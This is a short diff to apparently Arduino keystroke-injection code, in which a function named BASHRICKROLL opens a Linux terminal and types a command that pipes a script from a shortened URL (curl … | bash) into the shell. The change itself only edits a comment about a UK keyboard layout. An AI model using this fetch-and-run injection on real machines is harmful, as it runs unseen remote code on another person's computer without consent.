@@ -102,7 +102,7 @@ void BASHRICKROLL()
     LINUXTERMINAL(); 
     delay(1500); 
     Keyboard.print("curl -s -L https://bit.ly/386ivNn "); 
-      //Arduino Pipe Issue 
+      //Arduino Pipe Issue - For UK keyboard layout
       Press("PIPE");    Keyboard.releaseAll();
     Keyboard.print(" bash");  
     Press("ENTER");  
